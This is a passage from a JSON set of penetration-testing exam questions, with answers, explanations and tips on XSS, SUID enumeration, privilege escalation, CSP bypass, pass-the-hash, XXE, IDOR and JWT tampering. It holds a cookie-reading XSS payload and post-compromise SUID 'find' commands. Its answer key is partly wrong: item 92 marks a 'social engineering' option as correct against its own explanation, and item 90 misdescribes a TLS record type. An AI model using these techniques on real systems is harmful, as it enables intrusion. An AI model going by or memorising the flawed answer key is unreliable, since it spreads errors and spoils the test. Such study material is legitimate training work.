            "explanation": "Both PtT and PtH allow authentication without knowing the plaintext password, but they target different authentication protocols. *Pass-the-Ticket* uses Kerberos tickets. *Pass-the-Hash* uses NTLM hashes. They are not the same attack, and neither involves *cracking* the password in the traditional sense (though cracking might be a step to *obtain* the hash or ticket initially). They are not social engineering or sniffing attacks *per se* (though the hash or ticket might be *obtained* through sniffing).",
            "examTip": "Pass-the-Ticket = Kerberos; Pass-the-Hash = NTLM. Both bypass need for plaintext password."
        },
        {
          "id": 85,
          "question": "You are analyzing network traffic using Wireshark. You want to filter the captured packets to show only HTTP GET requests that include the string 'admin' in the URL and originate from the IP address 192.168.1.100. Which of the following Wireshark display filters is MOST accurate and efficient?",
          "options":[
            "http && ip.addr == 192.168.1.100",
            "http.request.method == \"GET\" && ip.src == 192.168.1.100 && http.request.uri contains \"admin\"",
            "tcp.port == 80 && http.request.method == \"GET\"",
            "http.request.uri contains \"admin\""
          ],
          "correctAnswerIndex": 1,
          "explanation": "The most accurate and efficient filter combines all the necessary conditions: `http.request.method == \"GET\"` selects only HTTP GET requests. `ip.src == 192.168.1.100` selects traffic originating from the specified IP address. `http.request.uri contains \"admin\"` selects only requests where the URI (which includes the URL) contains the string 'admin'. Using the AND operator (`&&`) ensures that *all* conditions must be met. Option A shows all http traffic from all IPs. Option C lacks the source IP",
          "examTip": "Wireshark filters: Combine conditions with `&&` (AND) for precise filtering."
        },
        {
          "id": 86,
           "question": "Which of the following is a common and effective technique for discovering and exploiting vulnerabilities in web applications?",
           "options":[
             "Shoulder surfing.",
             "Using a combination of automated web application vulnerability scanners (e.g., Burp Suite, OWASP ZAP, Nikto, Acunetix) and manual testing techniques.  Manual testing should include, but not be limited to: input validation testing (fuzzing, boundary checks), session management testing (cookie analysis, session fixation/hijacking), authentication testing (brute-forcing, password spraying, credential stuffing), authorization testing (privilege escalation, IDOR), business logic testing, parameter tampering, and checking for common web vulnerabilities (XSS, SQLi, CSRF, LFI/RFI, command injection, XXE, SSRF, etc.).  Code review, if available, is also crucial.",
             "Phishing.",
             "Social engineering."
           ],
           "correctAnswerIndex": 1,
           "explanation": "A comprehensive web application security assessment requires a multi-faceted approach. Automated scanners provide broad coverage and identify common vulnerabilities, but manual testing is essential for finding more subtle flaws, logic errors, and complex attack scenarios. Code review (if possible) offers the deepest level of analysis. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "Automated web scanners + manual testing + code review = Comprehensive web application security assessment."
        },
        {
            "id": 87,
            "question": "What is 'command injection', and how does it differ from 'SQL injection'?",
            "options":[
              "Command injection and SQL injection are the same vulnerability; the terms are interchangeable.",
              "Command injection involves injecting malicious SQL code into database queries; SQL injection involves injecting operating system commands.",
              "Command injection involves injecting arbitrary operating system commands into an application, often through a web application or other input vector that is not properly sanitized or validated. These injected commands are then executed by the underlying operating system with the privileges of the vulnerable application. SQL injection, on the other hand, involves injecting malicious SQL code into database queries.",
              "Command injection is a type of social engineering attack, while SQL injection is a type of network attack."
            ],
            "correctAnswerIndex": 2,
            "explanation": "Command injection and SQL injection are both *injection* attacks, but they target different components. *Command injection* targets the *operating system*, allowing an attacker to execute arbitrary OS commands. *SQL injection* targets the *database*, allowing an attacker to manipulate database queries. They are distinct vulnerabilities with different impacts and exploitation techniques.",
            "examTip": "Command injection = OS commands; SQL injection = Database queries."
        },
        {
           "id": 88,
          "question": "You are performing a penetration test of a web application and discover a potential vulnerability. When you enter the following string into a search field: `<script>alert(document.cookie)</script>`, a JavaScript alert box pops up displaying the contents of your cookies. What type of vulnerability have you confirmed, and what is the primary security risk?",
          "options":[
            "SQL Injection; the primary risk is unauthorized access to the application's database.",
            "Cross-Site Scripting (XSS); the primary risk is that an attacker can inject malicious scripts that are executed in the context of other users' browsers, potentially leading to cookie theft, session hijacking, website defacement, or redirection to malicious websites.",
            "Cross-Site Request Forgery (CSRF); the primary risk is that an attacker can force an authenticated user to perform unintended actions on the web application.",
            "Denial-of-Service (DoS); the primary risk is that the attacker can make the web application unavailable to legitimate users."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The successful execution of the injected JavaScript code (`<script>alert(document.cookie)</script>`) confirms a Cross-Site Scripting (XSS) vulnerability. The fact that the alert box displays your cookies demonstrates the ability to access sensitive information using JavaScript. The primary risk of XSS is the ability to execute arbitrary code in the context of other users' browsers, leading to various attacks like cookie theft (and subsequent session hijacking), redirection to malicious sites, and website defacement. It's not SQL injection (which targets databases), CSRF (which forces unintended actions), or DoS (which disrupts service availability).",
          "examTip": "Successful execution of injected JavaScript (especially accessing `document.cookie`) = Confirmed XSS."
        },
        {
          "id": 89,
          "question": "You have gained access to a Linux system. Which of the following commands would be MOST useful for listing all the SUID binaries on the system?",
          "options":[
              " `ls -l /`",
              " `find / -perm -u=s -type f 2>/dev/null`",
              " `cat /etc/passwd`",
              " `uname -a`"
          ],
          "correctAnswerIndex": 1,
          "explanation": "`find / -perm -u=s -type f 2>/dev/null` is the most effective command. Let's break it down: * `find /`: Starts the search from the root directory (`/`), meaning it will search the entire filesystem. * `-perm -u=s`: This is the key part. It searches for files with the SUID (Set User ID) bit set. The `-u=s` part specifically looks for the SUID bit.  The `-4000` could also be used, representing the SUID bit in octal. * `-type f`: Limits the search to regular files (not directories, links, etc.). * `2>/dev/null`: Redirects standard error (file descriptor 2) to `/dev/null`, effectively suppressing error messages (like 'Permission denied' when trying to access directories the user doesn't have permission for). This makes the output cleaner and focuses on the relevant results. SUID binaries are important because they run with the privileges of the file *owner* (often root), regardless of who executes them.  This makes them prime targets for privilege escalation if they contain vulnerabilities. `ls -l /` lists files in the root directory (not a comprehensive search). `cat /etc/passwd` displays user account information. `uname -a` shows system information.",
          "examTip": "`find / -perm -u=s -type f 2>/dev/null` (or `find / -perm -4000 -type f 2>/dev/null`) = Find SUID binaries (potential privilege escalation on Linux)."
        },
        {
          "id": 90,
          "question": "Examine the following `tcpdump` command:\n```bash\ntcpdump -i eth0 -w capture.pcap '((tcp[((tcp[12] & 0xf0) >> 2)] = 0x16) and (tcp[((tcp[12] & 0xf0) >> 2) + 1] = 0x03) and (tcp[((tcp[12] & 0xf0) >> 2) + 2] < 0x04)) or ((tcp[((tcp[12] & 0xf0) >> 2)] = 0x15) and (tcp[((tcp[12] & 0xf0) >> 2) + 1] = 0x03) and (tcp[((tcp[12] & 0xf0) >> 2) + 2] < 0x04))'\n```\nWhat type of network traffic is this `tcpdump` command specifically designed to capture, and why is this significant in a security context?",
          "options":[
            "All TCP traffic on the `eth0` interface.",
            "All HTTP traffic on the `eth0` interface.",
            "SSL/TLS handshake traffic (Client Hello and Server Hello) on the `eth0` interface. This is significant because it allows for analyzing the initial stages of SSL/TLS connections, potentially identifying weak cipher suites, outdated protocols, or other misconfigurations.",
            "All UDP traffic on the `eth0` interface."
          ],
          "correctAnswerIndex": 2,
          "explanation": "This `tcpdump` command is a highly specific filter designed to capture the *initial handshake* of SSL/TLS connections. Let's break down the complex filter: * `-i eth0`: Captures traffic on the `eth0` interface. * `-w capture.pcap`: Saves the captured traffic to a file named `capture.pcap`. * `'((tcp[((tcp[12] & 0xf0) >> 2)] = 0x16) ...)`: This part looks for specific byte values within the TCP and SSL/TLS headers. * `tcp[12] & 0xf0) >> 2`: This extracts the TCP data offset (header length) and converts it to bytes. * `tcp[((tcp[12] & 0xf0) >> 2)]`: This uses the calculated TCP header length to access the *first byte* of the TCP payload, which, in an SSL/TLS handshake, is the *record type*. * `= 0x16`: Checks if the record type is 0x16 (22 in decimal), which corresponds to a *handshake* message. * `tcp[((tcp[12] & 0xf0) >> 2) + 1] = 0x03`: Checks if the major version is 0x03, which is used by SSLv3, and TLS 1.0-1.3 * `tcp[((tcp[12] & 0xf0) >> 2) + 2] < 0x04)`: Checks if the minor version is less than 0x04 which it would be for SSLv3, and TLS 1.0-1.3.  * `((tcp[((tcp[12] & 0xf0) >> 2)] = 0x15) ...)`:  Looks for a similar hex value for a different handshake.  By checking these specific byte values, the filter isolates the initial SSL/TLS handshake packets (Client Hello and Server Hello), which are crucial for analyzing the security of the connection (e.g., identifying supported cipher suites, protocol versions). This is *much* more specific than just capturing all TCP or HTTP traffic.",
          "examTip": "Complex `tcpdump` filters can isolate specific protocol handshakes (e.g., SSL/TLS) by examining header byte values."
        },
        {
          "id": 91,
          "question": "You are performing a penetration test and gain access to a system with a limited user account. You discover a running process that has significantly higher privileges than your current user.  What is the general term for the attack you would likely attempt NEXT, and what are some common techniques for achieving it on both Windows and Linux systems?",
          "options":[
              "Denial-of-Service (DoS); common techniques include flooding the network with traffic or exploiting vulnerabilities to crash the system.",
              "Privilege Escalation; on Windows, common techniques include exploiting unpatched vulnerabilities, misconfigured services, token impersonation, DLL hijacking/preloading, and credential theft (e.g., using Mimikatz). On Linux, common techniques include exploiting SUID binaries, misconfigured services, kernel vulnerabilities, weak file permissions, and sudo misconfigurations.",
              "Cross-Site Scripting (XSS); common techniques include injecting malicious JavaScript code into input fields.",
              "SQL Injection (SQLi); common techniques include injecting malicious SQL code into input fields."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The scenario describes the classic setup for *privilege escalation* â€“ gaining higher access rights than initially granted. The goal is to move from a limited user account to a higher-privileged account (e.g., Administrator/root). The question then correctly lists common privilege escalation techniques for both Windows and Linux. DoS disrupts service, XSS is a web vulnerability, and SQLi targets databases; none of these directly lead to privilege escalation on the local system.",
          "examTip": "Privilege escalation = Gaining higher access rights (e.g., from user to administrator/root)."
        },
                {
          "id": 92,
            "question": "What is 'DLL preloading', and how does it differ from 'DLL hijacking'?",
            "options":[
              "DLL preloading and DLL hijacking are just different names for the same attack; there is no real difference between them, and both are types of phishing",
              "DLL preloading is a type of social engineering attack, while DLL hijacking is a type of network attack.",
              "DLL preloading involves exploiting vulnerabilities in the application's *manifest* or *configuration* to specify a malicious DLL to be loaded *before* the legitimate DLL, even if the legitimate DLL is present in its expected location. DLL hijacking typically exploits the Windows DLL *search order* to load a malicious DLL *instead of* a missing or misplaced legitimate DLL.",
              "DLL preloading is a technique used for improving the performance of applications by preloading required DLLs into memory, while DLL hijacking is a method for encrypting DLL files to secure them."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Both DLL preloading and DLL hijacking aim to load a malicious DLL. However, they use different mechanisms. *DLL hijacking* often exploits the Windows DLL search order, placing a malicious DLL in a location that's searched *before* the legitimate DLL's location. *DLL preloading* exploits the application's *configuration* (e.g., its manifest file or other configuration settings) to explicitly force the loading of a malicious DLL *before* any others, *regardless* of the search order. Preloading can therefore be more reliable and harder to detect, as it doesn't depend on a missing or misplaced legitimate DLL. They are not social engineering or network attacks *per se*, nor are they related to performance improvement or encryption.",
            "examTip": "DLL hijacking = Exploits search order; DLL preloading = Exploits application configuration (manifest)."
        },
        {
          "id": 93,
          "question": "You are performing a penetration test and discover a web application that is vulnerable to Cross-Site Scripting (XSS).  However, the application has a Content Security Policy (CSP) in place that restricts the sources from which scripts can be loaded.  The CSP includes the following directive:\n```http\nContent-Security-Policy: script-src 'self' https://cdn.example.com;\n```\nYou also discover that `https://cdn.example.com` hosts a JSONP endpoint that is vulnerable to callback manipulation.  How could you *potentially* bypass the CSP and exploit the XSS vulnerability, and what is the underlying principle that makes this bypass possible?",
          "options":[
            "You cannot bypass the CSP; it is a foolproof security mechanism that completely prevents XSS attacks.",
            "You could potentially leverage the vulnerable JSONP endpoint on `https://cdn.example.com` to inject a malicious script.  Since the CSP allows scripts from `https://cdn.example.com`, the browser might execute the script, even though it originated from a JSONP callback.  This bypass relies on the principle that the CSP trusts the specified domain, and any vulnerability on that trusted domain can be used to circumvent the policy.",
            "You could perform a denial-of-service (DoS) attack against the web server to disable the CSP.",
            "You could perform a SQL injection attack against the web server's database to modify the CSP."
          ],
          "correctAnswerIndex": 1,
          "explanation": "CSP bypasses often involve finding weaknesses in the *policy itself* or leveraging *other vulnerabilities* on domains that are *trusted* by the CSP. JSONP (JSON with Padding) is a technique that allows websites to request data from a server in a different domain, bypassing the same-origin policy. JSONP endpoints often use a callback function, and if this callback function is not properly validated, an attacker can inject arbitrary JavaScript code. In this scenario, since the CSP allows scripts from `https://cdn.example.com`, and that domain has a vulnerable JSONP endpoint, an attacker could craft a request to that endpoint with a malicious callback function, effectively injecting and executing their script despite the CSP. This highlights that *trusting external domains in a CSP introduces a risk if those domains have vulnerabilities*. DoS and SQLi are unrelated to this specific CSP bypass.",
          "examTip": "CSP bypass = Leverage vulnerabilities (JSONP, open redirects, XSS) on domains *trusted* by the CSP."
        },
         {
            "id": 94,
            "question":"What is 'pass-the-ticket' (PtT), and how does it differ from 'pass-the-hash' (PtH) in the context of Windows authentication?",
            "options":[
              "PtT and PtH are different names for the same attack; both involve using stolen NTLM hashes to authenticate to Windows systems.",
              "PtT involves using a captured or forged Kerberos ticket to authenticate to a service *without* needing the user's password or password hash. PtH involves using a captured NTLM hash to authenticate, also without needing the plaintext password. They target different authentication mechanisms and have different requirements and limitations.",
              "PtT involves cracking a user's password using a rainbow table, while PtH involves cracking a user's password using a dictionary attack.",
              "PtT is a type of social engineering attack that targets the Kerberos protocol, while PtH is a type of network sniffing attack that targets the NTLM protocol."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Both PtT and PtH allow authentication without knowing the plaintext password, but they target different authentication protocols. *Pass-the-Ticket* uses *Kerberos tickets*. *Pass-the-Hash* uses *NTLM hashes*.  They are distinct attacks with different requirements. Kerberos tickets are used for authentication within a Windows domain, while NTLM hashes are used for authentication to individual Windows systems and in some older network protocols. Neither involves *cracking* the password in the traditional sense (though cracking might be used to *obtain* the hash or ticket initially). They are not social engineering or sniffing attacks *per se* (though the hash or ticket might be *obtained* through sniffing or other means).",
            "examTip": "Pass-the-Ticket = Kerberos; Pass-the-Hash = NTLM. Both bypass the need for the plaintext password."
        },
        {
            "id": 95,
            "question": "You have gained access to a Linux system.  Which of the following commands would be MOST useful for identifying SUID binaries owned by the root user?",
            "options":[
              "`ls -l /`",
              "`find / -user root -perm -4000 -type f 2>/dev/null`",
              "`cat /etc/passwd`",
              "`uname -a`"
            ],
            "correctAnswerIndex": 1,
            "explanation": "The command `find / -user root -perm -4000 -type f 2>/dev/null` is specifically designed to find SUID binaries owned by root. Let's break it down: * `find /`: Starts the search from the root directory (`/`), searching the entire filesystem. * `-user root`: Filters the results to show only files owned by the `root` user. * `-perm -4000`: This is the key part.  It searches for files with the SUID (Set User ID) bit set. `-4000` represents the SUID permission in octal notation. * `-type f`: Limits the search to regular files (not directories, links, etc.). * `2>/dev/null`: Redirects standard error (file descriptor 2) to `/dev/null`, suppressing error messages (like 'Permission denied' when trying to access directories the user doesn't have permission for). SUID binaries are important because they run with the privileges of the file *owner* (in this case, root), regardless of who executes them. This makes them prime targets for privilege escalation if they contain vulnerabilities. `ls -l /` lists files in the root directory. `cat /etc/passwd` displays user account information. `uname -a` shows system information.",
            "examTip": "`find / -user root -perm -4000 -type f 2>/dev/null` = Find SUID binaries owned by root (Linux)."
        },
         {
            "id": 96,
             "question": "What is 'living off the land', and why is it a significant concern in modern cyberattacks?",
             "options":[
               "Living off the land is a type of social engineering attack where an attacker blends in with the target organization's employees.",
                "Living off the land involves using legitimate, built-in system tools and utilities (e.g., PowerShell, WMI, net.exe on Windows; bash, ssh, find on Linux) to perform malicious actions, rather than relying on custom malware or exploits. This makes detection more difficult because the attacker's activities blend in with normal system activity.",
                "Living off the land is a method for encrypting data using only built-in operating system features.",
                "Living off the land is a technique for improving the performance of system utilities."
             ],
             "correctAnswerIndex": 1,
             "explanation": "'Living off the land' refers to attackers using *pre-existing, legitimate system tools* to perform malicious actions. This makes detection much harder because the attacker's activities look like normal system administration tasks. Instead of relying on custom malware (which might be detected by antivirus), they use tools like PowerShell, WMI, `net.exe` (on Windows), or `bash`, `ssh`, `find` (on Linux) to move laterally, escalate privileges, exfiltrate data, etc. It's not a social engineering attack *per se*, an encryption method, or a performance improvement technique.",
             "examTip": "Living off the land = Using legitimate system tools for malicious purposes (harder to detect)."
        },
        {
            "id": 97,
            "question": "You are performing a penetration test against a web application and suspect that it might be vulnerable to XML External Entity (XXE) injection. Which of the following BEST describes the steps you would take to confirm and potentially exploit this vulnerability?",
            "options":[
               "Attempt to inject malicious JavaScript code into input fields to test for Cross-Site Scripting (XSS).",
                "Attempt to craft malicious XML input that defines and uses external entities to access local files on the server (e.g., `/etc/passwd`, `C:\\Windows\\win.ini`), access internal network resources (potentially performing Server-Side Request Forgery), or cause a denial-of-service. You would test for both direct XXE (where the file contents are returned in the application's response) and blind XXE (where you need to use out-of-band techniques, like an external DTD, to exfiltrate data).",
                "Attempt to inject malicious SQL code into input fields to test for SQL Injection.",
                "Attempt to force an authenticated user to execute unwanted actions on the web application by tricking their browser into sending a forged request."
            ],
            "correctAnswerIndex": 1,
            "explanation": "XXE attacks specifically target vulnerabilities in how applications parse XML input. The attacker crafts malicious XML that defines *external entities* â€“ references to external resources (like files or URLs). If the XML parser is misconfigured or doesn't properly validate these entities, the attacker can potentially read local files, access internal network resources (SSRF-like attacks), cause a denial-of-service, or even achieve remote code execution. Testing involves trying different XXE payloads, including those for direct XXE (where you see the result in the response) and blind XXE (where you need out-of-band techniques to exfiltrate data). XSS involves injecting JavaScript, SQLi targets databases, and CSRF forces unintended user actions.",
            "examTip": "XXE = Exploiting XML external entities to access files, internal resources, or cause DoS."
        },
        {
           "id": 98,
          "question": "Examine the following Burp Suite Repeater request and response. The request is a *modification* of a legitimate request observed during normal application use:\n**Original Request:**\n```\nGET /profile.php?userid=123 HTTP/1.1\nHost: example.com\nCookie: sessionid=abcdefg\n```\n**Modified Request:**\n```\nGET /profile.php?userid=456 HTTP/1.1\nHost: example.com\nCookie: sessionid=abcdefg\n```\n**Response to Modified Request:**\n```\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n... Profile information for user 456 ...\n```\nWhat type of vulnerability is MOST likely being tested for, and what does the response indicate?",
          "options":[
            "Cross-Site Scripting (XSS); the response indicates the attack was unsuccessful.",
            "Insecure Direct Object Reference (IDOR); the response indicates the attack was likely successful.",
            "SQL Injection (SQLi); the response indicates the attack was likely successful.",
            "Cross-Site Request Forgery (CSRF); the response indicates the attack was unsuccessful."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The attacker has modified the `userid` parameter in the URL, changing it from the original value (presumably their own user ID) to a different value (456). The `200 OK` response and the fact that the response contains profile information for user 456 strongly suggest that the attacker was able to access another user's profile data *without proper authorization*. This is a classic example of an Insecure Direct Object Reference (IDOR) vulnerability. The application is using a direct reference to an internal object (the user profile) based on user input (`userid`) *without* verifying that the currently logged-in user (`sessionid=abcdefg`) is actually *authorized* to access that object. It's not XSS (no script injection), SQLi (no SQL code manipulation â€“ though the underlying implementation *might* use SQL), or CSRF (no forced user action).",
          "examTip": "IDOR = Accessing other users' data by modifying direct object references (e.g., user IDs, file IDs) in requests."
        },
        {
            "id": 99,
            "question": "You are performing a penetration test and have gained access to a Windows system.  You want to determine if any network shares are available on the system. Which command is BEST suited for this task?",
            "options":[
              " `ipconfig /all`",
              " `net view` (or `net view \\\\localhost`)",
              " `netstat -an`",
              " `tasklist`"
            ],
            "correctAnswerIndex": 1,
            "explanation": "The `net view` command on Windows is used to display a list of resources being shared on a computer.  `net view` by itself will often show shares on the local machine and potentially on other discoverable machines on the network. `net view \\\\localhost` specifically lists shares on the local machine. `ipconfig /all` shows network interface configuration. `netstat -an` shows network connections and listening ports. `tasklist` shows running processes.",
            "examTip": "`net view` (or `net view \\\\localhost`) = List network shares (Windows)."
        },
        {
            "id": 100,
            "question": "You are analyzing a web application and notice that it uses a client-side JavaScript framework (like React, Angular, or Vue.js) to handle user authentication and authorization.  The application makes API calls to a backend server to retrieve data, and these API calls include a JWT (JSON Web Token) for authentication. You are able to intercept and modify the JWT using a web proxy. What is a potential attack you could attempt, and what security implications would a successful attack have?",
            "options":[
              "You could perform a SQL injection attack by modifying the JWT.",
              "If the JWT is not properly validated on the *server-side*, or if the signature verification is weak or missing, you could modify the claims within the JWT (e.g., changing the user ID, role, or permissions) to potentially gain unauthorized access to resources or perform actions as a different user.  This highlights the importance of robust server-side validation of JWTs.",
              "You could perform a cross-site scripting (XSS) attack by injecting malicious JavaScript code into the JWT.",
              "You could perform a denial-of-service (DoS) attack by sending a large number of modified JWTs to the server."
            ],
            "correctAnswerIndex": 1,
            "explanation": "JWTs (JSON Web Tokens) are often used for authentication and authorization in modern web applications.  They contain claims (information about the user, their roles, etc.) that the server should *validate*. A critical security principle is that JWTs *must* be validated on the *server-side*. If the server doesn't properly verify the JWT's signature or blindly trusts the claims within it, an attacker who can intercept and modify the JWT (e.g., using a web proxy) can potentially change their user ID, role, or permissions, gaining unauthorized access. This is *not* SQL injection (which targets databases) or XSS (which involves injecting scripts into web pages). While sending many modified JWTs *might* cause performance issues, it's not a classic DoS attack; the primary vulnerability is the lack of proper JWT validation on the server.",
            "examTip": "JWTs *must* be validated on the server-side; client-side validation is insufficient.  Modifying JWT claims without valid signature = Potential unauthorized access."
        }
  ]
}
